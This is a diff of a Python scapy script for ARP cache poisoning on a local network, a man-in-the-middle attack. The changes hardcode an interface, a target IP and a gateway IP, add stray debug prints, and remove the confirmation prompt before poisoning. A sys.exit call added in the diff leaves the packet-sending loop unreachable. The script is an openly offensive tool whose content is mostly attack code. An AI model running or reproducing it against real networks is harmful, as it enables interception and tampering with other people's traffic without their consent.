@@ -1,9 +1,9 @@
-#!/usr/bin/env python
 # -*- coding: utf-8 -*-
 import os
 import sys
 import signal
 import logging
+print("fisrt")
 from scapy.all import (
     get_if_hwaddr,
     getmacbyip,
@@ -14,10 +14,11 @@ from scapy.all import (
 from optparse import OptionParser
 from time import sleep
 
-logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # Gets rid of IPV6 Error when importing scapy
+#logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # Gets rid of IPV6 Error when importing scapy
 
 
-def main():
+def mains():
+    print("------")
     if os.geteuid() != 0:
         print "[-] Run me as root"
         sys.exit(1)
@@ -31,12 +32,17 @@ def main():
     parser.add_option('-s', action='store_true', dest='summary', default=False, help='Show packet summary and ask for confirmation before poisoning')
     (options, args) = parser.parse_args()
 
-    if len(args) != 1 or options.interface is None:
-        parser.print_help()
-        sys.exit(0)
-
-    host = args[0]
+    options.interface='eno1'
+    options.target='192.68.4.131'
+    options.mode='req'
+    options.reverse=True
+    #host = args[0]
+    host='192.68.4.1' #网关ip
     mac = get_if_hwaddr(options.interface) #得到本机mac地址
+    print("target is:")
+    print(options.target)
+    print(options.reverse)
+    sys.exit(1)
 
     def build_req(target, host):
         #target 目标地址
@@ -87,17 +93,14 @@ def main():
             r_pkt = build_req(host, options.target)
         elif options.mode == 'rep':
             r_pkt = build_rep(host, options.target)
-
-    if options.summary:
-        pkt.show()
-        r_pkt.show()
-        ans = raw_input('\n[*] Continue? [Y|n]: ').lower()
-        if ans == 'y' or len(ans) == 0:
-            pass
-        else:
-            sys.exit(0)
-
+    print("while")
     while True:
         sendp(pkt, inter=2, iface=options.interface)
         if options.reverse:
+            print("double")
             sendp(r_pkt, inter=2, iface=options.interface)
+
+
+if __name__=="__main__":
+    print("main")
+    mains()
